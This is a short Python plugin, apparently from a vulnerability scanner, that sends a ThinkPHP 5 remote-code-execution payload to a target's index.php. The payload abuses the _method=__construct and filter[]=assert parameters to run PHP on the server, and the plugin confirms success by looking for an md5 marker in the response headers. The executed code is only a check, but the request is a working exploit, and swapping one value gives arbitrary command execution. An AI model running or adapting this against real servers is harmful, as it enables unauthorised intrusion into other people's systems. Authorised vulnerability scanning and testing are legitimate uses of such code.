#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 20/3/25 11:41
# @Author  : Chaos
# @File    : tp5_rce2.py

import requests
from settings import HTTP

req_timeout = 30

def plugin_info():
	plugin_info = {
			"level":"High",
	        "category":"远程命令执行",
	        "extra":"tp5_RCE",
		    "info":""
	        }
	return plugin_info

def poc(hostname, port, service):
	if service.lower().find('http') < 0:
		return False, False
	url = '%s://%s:%s' % (service, hostname, port)
	dsUrl = url.rstrip('/') + "/index.php"
	payload2 = (
		("_method",(None, "__construct")),
		("filter[]", (None, "assert")),
		("method", (None, "get")),
		("get[0]", (None, "header(md5(33))")),
	)
	try:

		c = requests.post(dsUrl, timeout=req_timeout, files=payload2,
		                  verify=False,headers=HTTP.HEADERS, allow_redirects=False)
		if dict(c.headers).__contains__('182be0c5cdcd5072bb1864cdee4d3d6e'):
			return dsUrl, c.content
	except Exception as e:
		print(str(e))
	return False, False
